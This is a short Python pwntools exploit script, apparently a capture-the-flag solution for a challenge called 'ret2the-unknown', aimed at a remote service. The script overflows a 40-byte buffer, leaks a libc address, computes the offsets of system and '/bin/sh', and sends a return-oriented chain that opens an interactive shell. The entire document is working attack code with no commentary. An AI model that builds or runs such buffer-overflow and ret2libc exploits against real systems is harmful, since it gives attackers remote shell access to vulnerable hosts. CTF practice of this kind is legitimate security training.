from pwn import *

#p = process("./ret2the-unknown")
p = remote("mc.ax", 31568)


#pid = gdb.attach(p,gdbscript="b *  main+120")

pad = "\0" * 40

puts_got = p64(0x00404018)
puts_plt = p64(0x0401074)
pop_rdi_ret = p64(0x00000000004012a3)
main = p64(0x00401186)
ret = p64(0x000000000040101a)

payload = pad
payload += main


p.sendlineafter("?\n",payload)
print "1 ",p.recvline()
leak = int(p.recvline().split(" ")[8],16)
print "1 ",p.recvline()

print "leak: ",hex(leak)


libc_base = leak - 0x0000000000058560
system = libc_base +0x0000000000449c0
binsh = libc_base + 0x181519
gadget = libc_base + 0x4484f

payload1 = pad
payload1 += pop_rdi_ret
payload1 += p64(binsh)
payload1 += ret
payload1 += p64(system)


p.sendlineafter("?\n",payload1)

p.interactive()